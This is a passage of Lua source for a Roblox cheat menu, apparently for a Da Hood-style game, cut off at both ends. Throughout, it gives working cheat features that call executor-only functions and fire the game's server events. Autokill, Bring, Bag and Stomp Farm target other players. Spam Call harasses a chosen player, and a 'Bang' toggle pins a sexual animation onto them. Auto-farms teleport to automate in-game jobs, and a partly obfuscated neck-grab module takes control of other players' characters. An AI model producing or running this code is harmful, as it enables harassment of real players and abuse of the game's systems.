             wait(1)
             if viewingplr == true then
               game.Workspace.Camera.CameraSubject = game.Players[locktarget].Character.Humanoid;
             end
           end)
         
         
         
            else
               
               viewingplr = false
         game.Workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
         
         
            end
    end
})

lightattackmode = false
TargetImport:CreateToggle({
    Name = "Set Attack To Light",
    Flag = "Set Attack To Light",
    Default = false,
    Callback = function(bool)
        if bool then
            lightattackmode = true
        else
            lightattackmode = false
        end
    end
})

calltarget = false
TargetImport:CreateToggle({
    Name = "Spam Call",
    Flag = "Spam Call",
    Default = false,
    Callback = function(bool)
        if bool then
            calltarget = true
            while calltarget == true do
                game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
                wait()
                if game.Players.LocalPlayer.Backpack:FindFirstChild("[Phone]") then
                    game.Players.LocalPlayer.Backpack:FindFirstChild("[Phone]").Parent = game.Players.LocalPlayer.Character
                end
                wait()
                game:GetService("ReplicatedStorage").MainEvent:FireServer("PhoneCall", locktarget)
                wait(.5)
            end
              else
                calltarget = false
              end
    end
})



bangplr = false
TargetImport:CreateToggle({
    Name = "Bang",
    Flag = "Bang",
    Default = false,
    Callback = function(bool)
        if bangplr == false then

            bangsavepos = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position
                wait()
                
                local player = game.Players.LocalPlayer
                local BangAnim = Instance.new("Animation")
                BangAnim.AnimationId = "rbxassetid://3119980985"
                local BangAnimPlay = player.Character:WaitForChild("Humanoid"):LoadAnimation(BangAnim)
                BangAnimPlay:Play()
                BangAnimPlay:AdjustSpeed(2)
                
                bangplr = true
                if SoundOnClick == true then PlaySoundOnClick() end
        
            elseif bangplr == true then
            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(bangsavepos)
        for i,v in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
              if v.Animation.AnimationId == "rbxassetid://3119980985" then
                v:Stop()
              end
            end
        
                bangplr = false
                if SoundOnClick == true then PlaySoundOnClick() end
            end
    end
})


local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local OWNER = Players.LocalPlayer
local Loop

badping = false

TargetImport:CreateToggle({
    Name = "Autokill",
    Flag = "Autokill",
    Default = false,
    Callback = function(bool)
        local player = Players.LocalPlayer
        local OldFlingPos = player.Character.HumanoidRootPart.Position

        local function loopFunction()
            local success, err = pcall(function()
                local CharacterEmmy = Players:FindFirstChild(locktarget) and Players:FindFirstChild(locktarget).Character
                if CharacterEmmy and CharacterEmmy:FindFirstChild("HumanoidRootPart") then
                    local OldY = CharacterEmmy.HumanoidRootPart.Position.Y

                    if player.Character then
                        local FlingTorso = CharacterEmmy:FindFirstChild("UpperTorso")
                        local dis = 3.85
                        local increase = 6
                        local xchange = (CharacterEmmy.Humanoid.MoveDirection.X < 0 and -increase) or (CharacterEmmy.Humanoid.MoveDirection.X > 0 and increase) or 0
                        local zchange = (CharacterEmmy.Humanoid.MoveDirection.Z < 0 and -increase) or (CharacterEmmy.Humanoid.MoveDirection.Z > 0 and increase) or 0

                        if CharacterEmmy:FindFirstChild("BodyEffects"):FindFirstChild("K.O").Value then
                            if not CharacterEmmy:FindFirstChild("BodyEffects"):FindFirstChild("Dead").Value and not OWNER.Character:FindFirstChild("BodyEffects"):FindFirstChild("Attacking").Value then
                                OWNER.Character.HumanoidRootPart.CFrame = CFrame.new(CharacterEmmy.UpperTorso.Position) * CFrame.new(0, 3, 0)
                                ReplicatedStorage.MainEvent:FireServer("Stomp")
                            else
                                OWNER.Character.HumanoidRootPart.CFrame = CFrame.new(math.random(-100, 400), 500, math.random(-100, 400))
                            end
                        else
                            local Char = player.Character
                            local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

                            for _, v in ipairs(Hum:GetPlayingAnimationTracks()) do
                                v:Stop()
                            end
                            local surg = player.Backpack:FindFirstChild("Combat")
                            if surg then
                                surg.Parent = player.Character
                            end
                            local New = player.Character:FindFirstChild("Combat")
                            if New then
                                New:Activate()
                            end
                            if OWNER.Character:FindFirstChild("BodyEffects"):FindFirstChild("Movement"):FindFirstChild("ReduceWalk") and badping == false then
                                player.Character.HumanoidRootPart.CFrame = CFrame.new(CharacterEmmy.HumanoidRootPart.Position + Vector3.new(0, -4.8, 0) + (CharacterEmmy.Humanoid.MoveDirection * 0.40 * CharacterEmmy.Humanoid.WalkSpeed)) * CFrame.Angles(math.pi * 0.5, 0, 0)
                                OWNER.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
                            else
                                OWNER.Character.HumanoidRootPart.CFrame = CFrame.new(math.random(-100, 400), 500, math.random(-100, 400))
                                OWNER.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
                            end
                        end
                    end
                end
            end)

            if not success then
                warn("Error occurred: ", err)
            end
        end

        local function Start()
            OldFlingPos = player.Character.HumanoidRootPart.Position
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction)
        end

        local function Pause()
            if Loop then
                Loop:Disconnect()
                Loop = nil
                local vectorZero = Vector3.new(0, 0, 0)
                player.Character.PrimaryPart.Velocity = vectorZero
                player.Character.PrimaryPart.RotVelocity = vectorZero
                player.Character.HumanoidRootPart.CFrame = CFrame.new(OldFlingPos) * CFrame.Angles(math.rad(0), math.rad(137.92), math.rad(0))
            end
        end

        if bool then
            Start()
        else
            Pause()
        end
    end
})












game:GetService('RunService').Stepped:connect(function()
    if bangplr == true then
        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[locktarget].Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1)
    end
end)

bringPlr = false
TargetImport:CreateButton({
    Name = "Bring",
    Callback = function()
        bringPlr = true
        bringSavePos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
        
        game.Workspace.CurrentCamera.CameraSubject = game.Players[locktarget].Character.Humanoid
        
        repeat
            task.wait()
            targetHRP = game.Players[locktarget].Character.HumanoidRootPart
            targetVelocity = targetHRP.Velocity
            predictionOffset = targetVelocity * 0.34
        
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetHRP.CFrame * CFrame.new(0, -5, 0) + predictionOffset
        
            if not game.Players.LocalPlayer.Character:FindFirstChild("Combat") then
                game.Players.LocalPlayer.Backpack:FindFirstChild("Combat").Parent = game.Players.LocalPlayer.Character
            else
                if lightattackmode == false then
                    game.Players.LocalPlayer.Character:FindFirstChild('Combat'):Activate()
                elseif lightattackmode == true then
                    game.Players.LocalPlayer.Character:FindFirstChild('Combat'):Activate()
                    game.Players.LocalPlayer.Character:FindFirstChild('Combat'):Deactivate()
                end
            end
        until game.Players[locktarget].Character.BodyEffects:FindFirstChild("K.O").Value == true or not bringPlr
        
        repeat
            targetPosition = game.Players[locktarget].Character.UpperTorso.Position
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition) * CFrame.new(0, 3, 0)
        
            if not game.Players[locktarget].Character:FindFirstChild("K.O") then
                game:GetService("ReplicatedStorage").MainEvent:FireServer("Grabbing", false)
            end
            wait(0.2)
        until game.Players[locktarget].Character:FindFirstChild("GRABBING_CONSTRAINT") or not bringPlr
        
        wait(0.5)
        game.Workspace.CurrentCamera.CameraSubject = game.Players[locktarget].Character.Humanoid
        bringPlr = false
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(bringSavePos)
        game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid        
    end
})



TargetImport:CreateButton({
    Name = "Bag",
    Callback = function()
        game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid"):UnequipTools()
        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Ignored.Shop["[BrownBag] - $27"].Head.CFrame
        wait(0.3)
        fireclickdetector(game:GetService("Workspace").Ignored.Shop["[BrownBag] - $27"].ClickDetector)

        repeat wait() until game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("[BrownBag]")

        game:GetService("Players").LocalPlayer.Backpack["[BrownBag]"].Parent = game:GetService("Players").LocalPlayer.Character
        wait(0.1)
        game:GetService("Players").LocalPlayer.Character["[BrownBag]"]:Activate()

        while true do
            game:GetService("RunService").Heartbeat:Wait()
            if game:GetService("Players"):FindFirstChild(locktarget) then
                if game:GetService("Players")[locktarget].Character and game:GetService("Players")[locktarget].Character:FindFirstChild("HumanoidRootPart") then
                    game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Players")[locktarget].Character.HumanoidRootPart.Position - Vector3.new(0, 5, 0) + game:GetService("Players")[locktarget].Character.HumanoidRootPart.Velocity * 0.5)
                    if not game:GetService("Players")[locktarget].Character:FindFirstChild("Christmas_Sock") then
                        game:GetService("Players").LocalPlayer.Character["[BrownBag]"]:Activate()
                    else
                        break
                    end
                end
            end
        end

        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-319.2906494140625, 80.41372680664062, -210.28460693359375)
    end
})



local AutobuyTab = UI:CreatePage("Autobuy") -- creates a section in page with the name passed. This argument is reqiured.
local AutobuyTabImport = AutobuyTab:CreateSection("Autobuy:")


for i, v in pairs(game:GetService("Workspace").Ignored.Shop:GetChildren()) do
    AutobuyTabImport:CreateButton({
        Name = v.Name,
        Callback = function()
            local Pos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
            local Teleport = v:FindFirstChild("Head")
            if Teleport then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Teleport.CFrame
                local CD = v:FindFirstChild("ClickDetector")
                if CD then
                    wait(0.75)
                    fireclickdetector(CD)
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Pos
                end
            end
        end
    })
end


local FarmsTab = UI:CreatePage("Farms")
local FarmsTabImport = FarmsTab:CreateSection("AutoFarm Things:")

local isWeightFarmEnabled = false
local previousPosition = nil

FarmsTabImport:CreateToggle({
    Name = "Weight Farm",
    Flag = "Weight Farm",
    Default = false,
    Callback = function(bool)
        isWeightFarmEnabled = bool
        
        if isWeightFarmEnabled then
            previousPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
            
            while isWeightFarmEnabled do
                wait()
                if not game.Players.LocalPlayer.Character:FindFirstChild("[HeavyWeights]") then
                    wait()
                    local k = game.Workspace.Ignored.Shop["[HeavyWeights] - $265"]
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
                    
                    if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
                        wait(0.2)
                        fireclickdetector(k:FindFirstChild("ClickDetector"), 4)
                    end
                end
                
                if not game.Players.LocalPlayer.Character:FindFirstChild("[HeavyWeights]") then
                    local tool = game.Players.LocalPlayer.Backpack:WaitForChild("[HeavyWeights]")
                    tool.Parent = game.Players.LocalPlayer.Character
                end
                
                game:GetService("VirtualUser"):ClickButton1(Vector2.new())
                local d = Vector3.new(-1007.9, -51.15, -1014.340)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
            end
            
            if previousPosition then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(previousPosition)
            end
            
        else
            if previousPosition then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(previousPosition)
            end
        end
    end
})


hospitalfarm = false
FarmsTabImport:CreateToggle({
    Name = "Hospital Farm",
    Flag = "Hospital Farm",
    Default = false,
    Callback = function(bool)
        if hospitalfarm == false then
            hospitalfarm = true
            
            Notif("Hospital Farm Enabled!", 5)
            
            hospitalfarmsaveloc = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position
            wait()
            game:GetService("ReplicatedStorage").MainEvent:FireServer("Block",true)
            
            wait(.1)
            while hospitalfarm == true do
            wait()
            for i, v in pairs(game:service'Workspace'.Ignored.HospitalJob:GetChildren()) do
                if v.Name:find("Can I get the Red bottle") then
                    repeat
                        wait()
                    game:service'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:service'Workspace'.Ignored.HospitalJob.Red.Position) wait()
                    fireclickdetector(game:service'Workspace'.Ignored.HospitalJob.Red.ClickDetector) wait()
                    repeat wait() until v:findFirstChild("Head")
                    game:service'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Head.Position) wait()
                    fireclickdetector(v.ClickDetector)
                    until v.Name:find("Thank you!")
                elseif v.Name:find("Can I get the Blue bottle") then
                    repeat
                        wait()    
                    game:service'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:service'Workspace'.Ignored.HospitalJob.Blue.Position) wait()
                    fireclickdetector(game:service'Workspace'.Ignored.HospitalJob.Blue.ClickDetector) wait()
                    repeat wait() until v:findFirstChild("Head")
                    game:service'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Head.Position) wait()
                    fireclickdetector(v.ClickDetector)
                    until v.Name:find("Thank you!")
                elseif v.Name:find("Can I get the Green bottle") then
                    repeat
                        wait()
                    game:service'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:service'Workspace'.Ignored.HospitalJob.Green.Position) wait()
                    fireclickdetector(game:service'Workspace'.Ignored.HospitalJob.Green.ClickDetector) wait()
                    repeat wait() until v:findFirstChild("Head")
                    game:service'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Head.Position) wait()
                    fireclickdetector(v.ClickDetector)
                    until v.Name:find("Thank you!")
                elseif not v.Name:find("Can I get the Red bottle") or v.Name:find("Can I get the Blue bottle") or v.Name:find("Can I get the Green bottle") then
                game:service'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(56.169578552246, 11.749998092651, 117.1457824707) wait()
                game:service'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-68.71996307373, 11.749997138977, 118.62348175049) wait()
                game:service'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-65.490776062012, 11.749997138977, 274.65905761719) wait()
                game:service'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(72.370185852051, 11.749997138977, 273.08349609375) wait()
                end
                end
            end
            elseif hospitalfarm == true then
            
               hospitalfarm = false
               Notif("Hospital Farm Disabled!", 5)
                wait()
                game:GetService("ReplicatedStorage").MainEvent:FireServer("Block",false)
                wait(.5)
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(hospitalfarmsaveloc) 
            
            
            end
    end
})
















shoefarm = false
FarmsTabImport:CreateToggle({
    Name = "Shoe Farm",
    Flag = "Shoe Farm",
    Default = false,
    Callback = function(bool)
        if bool then
            shoefarm = true
repeat wait(.1)
			pcall(function()
				fireclickdetector(game:GetService("Workspace").Ignored["Clean the shoes on the floor and come to me for cash"].ClickDetector)
				for i,v in pairs(workspace.Ignored.Drop:GetChildren()) do
					if  v.Transparency == 0 and v:IsA("MeshPart") then
						game.Players.LocalPlayer.Character.HumanoidRootPart.Position = v.Position
						wait()
						fireclickdetector(v.ClickDetector)
					end
				end
			end)
			until shoefarm == false

else
shoefarm = false
Notif("Please wait as we turn shoe farm off", 6)
game.Players.LocalPlayer.Character.Head:Destroy()
game.Players.LocalPlayer.Character.RightHand:Destroy()
game.Players.LocalPlayer.Character.LeftHand:Destroy()
game.Players.LocalPlayer.Character.LowerTorso:Destroy()
game.Players.LocalPlayer.Character.UpperTorso:Destroy()
game.Players.LocalPlayer.Character.LeftLowerLeg:Destroy()
game.Players.LocalPlayer.Character.RightLowerLeg:Destroy()
game.Players.LocalPlayer.Character.RightFoot:Destroy()
game.Players.LocalPlayer.Character.LeftFoot:Destroy()
game.Players.LocalPlayer.Character.LeftUpperLeg:Destroy()
game.Players.LocalPlayer.Character.RightUpperLeg:Destroy()
game.Players.LocalPlayer.Character.RightUpperArm:Destroy()
game.Players.LocalPlayer.Character.RightLowerArm:Destroy()
game.Players.LocalPlayer.Character.LeftLowerArm:Destroy()
game.Players.LocalPlayer.Character.LeftUpperArm:Destroy()
wait(5)
Notif("Shoe Farm Disabled!", 5)
game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(shoefarmoldpos)

end

        end
})



autobox = false
FarmsTabImport:CreateToggle({
    Name = "Box Farm",
    Flag = "Box Farm",
    Default = false,
    Callback = function(bool)
        if bool then
            Notif("Auto Box Enabled!", 5)

            noclip = true
            game.Players.LocalPlayer.Backpack:FindFirstChild("Combat").Parent = game.Players.LocalPlayer.Character

            oldposboxing = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
            autobox = true
            
            local connection
            
            connection = game:GetService("RunService").Heartbeat:Connect(function()
                if autobox then
                    game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-279.363251, 22.5704575, -1142.79883, -0.629518926, -4.21714468e-08, -0.776985168, -6.35824335e-08, 1, -2.76080292e-09, 0.776985168, 4.76646278e-08, -0.629518926)
                    game.Players.LocalPlayer.Character:FindFirstChild('Combat'):Activate()
                    wait()
                    game.Players.LocalPlayer.Character:FindFirstChild('Combat'):Deactivate()
                end
            end)
        else
            autobox = false
            wait(.1)
        

            Notif("Auto Box Disabled!", 5)

            noclip = false
            
            if connection then
                connection:Disconnect()
            end
            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(oldposboxing)
        end
    end
})





FarmsTabImport:CreateToggle({
    Name = "Stomp Farm",
    Flag = "Stomp Farm",
    Default = false,
    Callback = function(bool)
        if bool then
            getgenv().stompall = true
            game:GetService("RunService").RenderStepped:Connect(function()
                if getgenv().stompall then
                    game:GetService("ReplicatedStorage").MainEvent:FireServer("Stomp")
                    for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
                        if p ~= game:GetService("Players").LocalPlayer and p.Character then
                            if p.Character:FindFirstChild("BodyEffects") then
                                if p.Character.BodyEffects:FindFirstChild("K.O") and p.Character.BodyEffects["K.O"]:IsA("BoolValue") and p.Character.BodyEffects["K.O"].Value then
                                    if not p.Character.BodyEffects:FindFirstChild("Dead") or not p.Character.BodyEffects.Dead.Value then
                                        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(p.Character.UpperTorso.Position) * CFrame.new(0, 3, 0)
                                        if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
                                            game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid").PlatformStand = true
                                        end
                                    else
                                        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-546, 173, 1)
                                    end
                                end
                            end
                        end
                    end
                end
            end)
        else
            getgenv().stompall = false
            if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
                game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid").PlatformStand = false
            end
        end
    end
})



local ExperimentalTab = UI:CreatePage("Experimental") -- creates a section in page with the name passed. This argument is reqiured.
local ExperimentalImport = ExperimentalTab:CreateSection("Experimentals:")



ExperimentalImport:CreateButton({
    Name = "Neck Grabs",
    Callback = function()
        game.StarterGui:SetCore("SendNotification", {
            Title = "Shadow Gui Neck Grab Loaded!"; 
            Text = "Made By faisal8754";
            Duration = 6;
        })
        
        
        
        
        
        
        TweenService = game:GetService("TweenService");
            OWNER = game:GetService("Players").LocalPlayer;
            local OriginalKeyUpValue = 0;
            function StopAudio()
                game:GetService("ReplicatedStorage"):WaitForChild("MainEvent"):FireServer("BoomboxStop");
            end
            function stop(ID, Key)
                local FlatIdent_61538 = 0;
                local cor;
                while true do
                    if (FlatIdent_61538 == 0) then
                        cor = coroutine.wrap(function()
                            local FlatIdent_67C40 = 0;
                            while true do
                                if (FlatIdent_67C40 == 0) then
                                    wait(OWNER.Character.LowerTorso.BOOMBOXSOUND.TimeLength - 0.1);
                                    if ((OWNER.Character.LowerTorso.BOOMBOXSOUND.SoundId == ("rbxassetid://" .. ID)) and (OriginalKeyUpValue == Key)) then
                                        StopAudio();
                                    end
                                    break;
                                end
                            end
                        end);
                        cor();
                        break;
                    end
                end
            end
            function Play(ID)
                if OWNER.Backpack:FindFirstChild("[Boombox]") then
                    local FlatIdent_89ECE = 0;
                    local Tool;
                    local cor;
                    while true do
                        if (FlatIdent_89ECE == 1) then
                            game.ReplicatedStorage.MainEvent:FireServer("Boombox", ID);
                            OWNER.Character["[Boombox]"].RequiresHandle = false;
                            FlatIdent_89ECE = 2;
                        end
                        if (FlatIdent_89ECE == 0) then
                            Tool = nil;
                            OWNER.Backpack["[Boombox]"].Parent = OWNER.Character;
                            FlatIdent_89ECE = 1;
                        end
                        if (FlatIdent_89ECE == 4) then
                            cor = coroutine.wrap(function()
                                repeat
                                    wait();
                                until (OWNER.Character.LowerTorso.BOOMBOXSOUND.SoundId == ("rbxassetid://" .. ID)) and (OWNER.Character.LowerTorso.BOOMBOXSOUND.TimeLength > 0.01) 
                                OriginalKeyUpValue = OriginalKeyUpValue + 1;
                                stop(ID, OriginalKeyUpValue);
                            end);
                            cor();
                            break;
                        end
                        if (FlatIdent_89ECE == 2) then
                            OWNER.Character["[Boombox]"].Parent = OWNER.Backpack;
                            OWNER.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false;
                            FlatIdent_89ECE = 3;
                        end
                        if (FlatIdent_89ECE == 3) then
                            if (Tool ~= true) then
                                if Tool then
                                    Tool.Parent = OWNER.Character;
                                end
                            end
                            OWNER.Character.LowerTorso:WaitForChild("BOOMBOXSOUND");
                            FlatIdent_89ECE = 4;
                        end
                    end
                end
            end
            function AddVelocity(Vel, Char)
                Char.HumanoidRootPart.Velocity = Char.HumanoidRootPart.Velocity + Vel;
            end
            OWNER = game:GetService("Players").LocalPlayer;
            RS = game:GetService("RunService");
            TS = game:GetService("TweenService");
            ANIM = OWNER.Character:WaitForChild("Animate");
            function AnimPlay(ID, SPEED)
                local FlatIdent_31A5A = 0;
                local animation;
                while true do
                    if (FlatIdent_31A5A == 2) then
                        if tonumber(SPEED) then
                            playing:AdjustSpeed(SPEED);
                        else
                            playing:AdjustSpeed(1);
                        end
                        animation:Destroy();
                        break;
                    end
                    if (FlatIdent_31A5A == 1) then
                        playing = OWNER.Character:WaitForChild("Humanoid"):LoadAnimation(animation);
                        playing:Play();
                        FlatIdent_31A5A = 2;
                    end
                    if (FlatIdent_31A5A == 0) then
                        animation = Instance.new("Animation", game:GetService("Workspace"));
                        animation.AnimationId = "rbxassetid://" .. ID;
                        FlatIdent_31A5A = 1;
                    end
                end
            end
            function AnimStop(ID, SPEED)
                for i, v in pairs(OWNER.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
                    if (v.Animation.AnimationId == ("rbxassetid://" .. ID)) then
                        if tonumber(SPEED) then
                            v:Stop(SPEED);
                        else
                            v:Stop();
                        end
                    end
                end
            end
            local LocalPlayer = game:GetService("Players").LocalPlayer;
            local OldChar = LocalPlayer.Character;
            getgenv().Bell = false;
            game:GetService("RunService").heartbeat:Connect(function()
                if (getgenv().Bell == true) then
                    local FlatIdent_6FA1 = 0;
                    local abc;
                    while true do
                        if (FlatIdent_6FA1 == 1) then
                            game:GetService("RunService").RenderStepped:Wait();
                            game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = abc;
                            break;
                        end
                        if (0 == FlatIdent_6FA1) then
                            abc = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity;
                            game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(1, 1, 1) * 1200;
                            FlatIdent_6FA1 = 1;
                        end
                    end
                end
            end);
            function chat(msg)
                local FlatIdent_940A0 = 0;
                local A_1;
                local A_2;
                local Event;
                while true do
                    if (1 == FlatIdent_940A0) then
                        Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest;
                        Event:FireServer(A_1, A_2);
                        break;
                    end
                    if (FlatIdent_940A0 == 0) then
                        A_1 = msg;
                        A_2 = "All";
                        FlatIdent_940A0 = 1;
                    end
                end
            end
            local Grabbed = false;
            local Up = false;
            local LocalPlayer = game:GetService("Players").LocalPlayer;
            local HawkGrabTool = Instance.new("Tool", LocalPlayer.Backpack);
            local Mouse = LocalPlayer:GetMouse();
            local OriginalKeyUpValue = 0;
            HawkGrabTool.RequiresHandle = false;
            HawkGrabTool.Name = "Activate";
            HawkGrabTool.Activated:Connect(function()
                game:GetService("ReplicatedStorage").MainEvent:FireServer("Grabbing", true);
                task.wait(0.1);
                repeat
                    task.wait(0.1);
                until (game.Players.LocalPlayer.Character.BodyEffects.Grabbed.Value ~= nil) and (game.Players.LocalPlayer.Character.BodyEffects.Grabbed.Value ~= "") 
                if ((game.Players.LocalPlayer.Character.BodyEffects.Grabbed.Value ~= nil) and (game.Players.LocalPlayer.Character.BodyEffects.Grabbed.Value ~= "")) then
                    local FlatIdent_40CF = 0;
                    local target;
                    while true do
                        if (FlatIdent_40CF == 1) then
                            task.wait(0.1);
                            Grabbed = true;
                            Up = false;
                            spawn(function()
                                local FlatIdent_65290 = 0;
                                local Animation;
                                local LoadAnimation;
                                while true do
                                    if (FlatIdent_65290 == 1) then
                                        LoadAnimation = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid"):LoadAnimation(Animation);
                                        LoadAnimation.Priority = Enum.AnimationPriority.Action;
                                        FlatIdent_65290 = 2;
                                    end
                                    if (FlatIdent_65290 == 2) then
                                        LoadAnimation:Play();
                                        LoadAnimation:AdjustSpeed(0.4);
                                        FlatIdent_65290 = 3;
                                    end
                                    if (FlatIdent_65290 == 3) then
                                        wait(0.3);
                                        LoadAnimation:AdjustSpeed(0);
                                        break;
                                    end
                                    if (FlatIdent_65290 == 0) then
                                        Animation = Instance.new("Animation");
                                        Animation.AnimationId = "rbxassetid://3135389157";
                                        FlatIdent_65290 = 1;
                                    end
                                end
                            end);
                            FlatIdent_40CF = 2;
                        end
                        if (FlatIdent_40CF == 0) then
                            target = tostring(game.Players.LocalPlayer.Character.BodyEffects.Grabbed.Value);
                            Grabbed = true;
                            game.Players[target].Character:FindFirstChild("GRABBING_CONSTRAINT").H.Length = 8999999488;
                            for i, Track in pairs(game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
                                if (Track.Animation.AnimationId == "rbxassetid://11075367458") then
                                    Track:Stop();
                                end
                            end
                            FlatIdent_40CF = 1;
                        end
                        if (FlatIdent_40CF == 2) then
                            Play(9105467029);
                            if not game.Players[target].Character.UpperTorso:FindFirstChild("BodyPosition") then
                                getfenv().bodypos = Instance.new("BodyPosition", game.Players[target].Character.UpperTorso);
                                getfenv().bodypos.D = 400;
                                getfenv().bodypos.MaxForce = Vector3.new(10000, 10000, 10000);
                                getfenv().bodygyro = Instance.new("BodyGyro", game.Players[target].Character.UpperTorso);
                                getfenv().bodygyro.MaxTorque = Vector3.new(10000, 10000, 10000);
                                getfenv().bodygyro.D = 200;
                            end
                            game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                                local FlatIdent_5BA5E = 0;
                                while true do
                                    if (FlatIdent_5BA5E == 0) then
                                        game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.RightHand.Position + Vector3.new(0, -0.9, 0);
                                        game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position);
                                        break;
                                    end
                                end
                            end);
                            for _, part in ipairs(game.Players[target].Character:GetChildren()) do
                                if part:IsA("BasePart") then
                                    part.CanCollide = false;
                                end
                            end
                            break;
                        end
                    end
                else
                    local FlatIdent_74348 = 0;
                    while true do
                        if (FlatIdent_74348 == 1) then
                            game.Players[target].Character.UpperTorso:FindFirstChild("BodyPosition"):Destroy();
                            game.Players[target].Character.UpperTorso:FindFirstChild("BodyGyro"):Destroy();
                            FlatIdent_74348 = 2;
                        end
                        if (FlatIdent_74348 == 0) then
                            Grabbed = false;
                            Up = false;
                            FlatIdent_74348 = 1;
                        end
                        if (2 == FlatIdent_74348) then
                            for i, Track in pairs(game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
                                if (Track.Animation.AnimationId == "rbxassetid://3135389157") then
                                    Track:Stop();
                                end
                            end
                            break;
                        end
                    end
                end
                game.Players.LocalPlayer.Character.BodyEffects.Grabbed:GetPropertyChangedSignal("Value"):connect(function()
                    if (game.Players.LocalPlayer.Character.BodyEffects.Grabbed.Value == nil) then
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        for i, Track in pairs(game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
                            if ((Track.Animation.AnimationId == "rbxassetid://3135389157") or (Track.Animation.AnimationId == "rbxassetid://14496531574") or (Track.Animation.AnimationId == "rbxassetid://3096047107")) then
                                Track:Stop();
                            end
                        end
                    end
                end);
            end);
        
        
        
        
        
        
        
            local LocalPlayer = game:GetService("Players").LocalPlayer;
            local GetTool = Instance.new("Tool", LocalPlayer.Backpack);
            local Mouse = LocalPlayer:GetMouse();
            GetTool.RequiresHandle = false;
            GetTool.Name = "Get Over Here Punch";
            GetTool.Activated:Connect(function()
                if (Grabbed == true) then
                    if (Up == false) then
                        local target = tostring(game.Players.LocalPlayer.Character.BodyEffects.Grabbed.Value);
                        for i, Track in pairs(game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
                            if (Track.Animation.AnimationId == "rbxassetid://3135389157") then
